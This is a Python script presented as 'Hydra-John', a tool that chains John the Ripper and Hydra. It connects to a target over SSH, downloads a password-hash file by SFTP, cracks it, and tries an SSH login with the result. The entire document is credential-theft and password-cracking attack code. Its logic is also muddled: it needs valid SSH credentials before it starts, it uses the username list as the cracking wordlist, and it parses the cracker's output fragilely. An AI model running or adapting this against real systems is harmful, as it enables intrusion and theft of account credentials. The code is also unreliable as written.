import argparse
import subprocess
import paramiko
import socket

def display_help():
    help_text = """
    Hydra-John: A hybrid tool combining John-the-Ripper and Hydra functionalities.

    Usage:
      hydra-john -u <username or username wordlist> -ptph <path to the password hash> -host <target_host_ip> -port <target_port> -tuser <target_user> -tpass <target_password>

    Options:
      -u, --user       Specify a single username or a wordlist containing usernames.
      -ptph, --path    Specify the path to the password hash on the target system.
      -host, --host    Specify the target system hostname or IP address.
      -port, --port    Specify the SSH port of the target system (default: 22).
      -tuser, --tuser  Specify the SSH username for the target system.
      -tpass, --tpass  Specify the SSH password for the target system.
      -help            Display this help message.
    """
    print(help_text)

def parse_arguments():
    parser = argparse.ArgumentParser(description="Hydra-John: A hybrid tool combining John-the-Ripper and Hydra functionalities.")
    parser.add_argument('-u', '--user', required=True, help='Specify a single username or a wordlist containing usernames.')
    parser.add_argument('-ptph', '--path', required=True, help='Specify the path to the password hash on the target system.')
    parser.add_argument('-host', '--host', required=True, help='Specify the target system hostname or IP address.')
    parser.add_argument('-port', '--port', type=int, default=22, help='Specify the SSH port of the target system.')
    parser.add_argument('-tuser', '--tuser', required=True, help='Specify the SSH username for the target system.')
    parser.add_argument('-tpass', '--tpass', required=True, help='Specify the SSH password for the target system.')
    args = parser.parse_args()
    return args

def is_target_online(host, port):
    try:
        socket.create_connection((host, port), timeout=5)
        return True
    except Exception as e:
        print(f"Target system is offline: {e}")
        return False

def connect_to_target(host, port, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port, username, password)
        return ssh
    except Exception as e:
        print(f"Failed to connect to target: {e}")
        return None

def retrieve_password_hash(ssh, hash_path):
    try:
        sftp = ssh.open_sftp()
        sftp.get(hash_path, 'password_hash.txt')
        sftp.close()
        print("Password hash retrieved successfully.")
        return 'password_hash.txt'
    except Exception as e:
        print(f"Failed to retrieve password hash: {e}")
        return None

def crack_password(hash_file, username_file):
    print("Cracking password...")
    subprocess.run(['john', '--wordlist=' + username_file, hash_file])
    result = subprocess.run(['john', '--show', hash_file], capture_output=True, text=True)
    print("Password cracking result:")
    print(result.stdout)
    return result.stdout

def login_with_cracked_password(host, port, username, cracked_password):
    print(f"Attempting to login with cracked password: {cracked_password}")
    hydra_cmd = [
        'hydra',
        '-l', username,
        '-p', cracked_password.strip(),
        f'ssh://{host}',
        '-s', str(port)
    ]
    subprocess.run(hydra_cmd)

def main():
    args = parse_arguments()
    user = args.user
    hash_path = args.path
    target_host = args.host
    target_port = args.port
    target_username = args.tuser
    target_password = args.tpass

    if is_target_online(target_host, target_port):
        ssh = connect_to_target(target_host, target_port, target_username, target_password)
        if ssh:
            hash_file = retrieve_password_hash(ssh, hash_path)
            if hash_file:
                cracked_output = crack_password(hash_file, user)
                cracked_password = cracked_output.split(':')[1].split('\n')[0]  # Extract the cracked password
                login_with_cracked_password(target_host, target_port, target_username, cracked_password)
            ssh.close()
    else:
        print("Target system is offline. Exiting.")

if __name__ == "__main__":
    main()
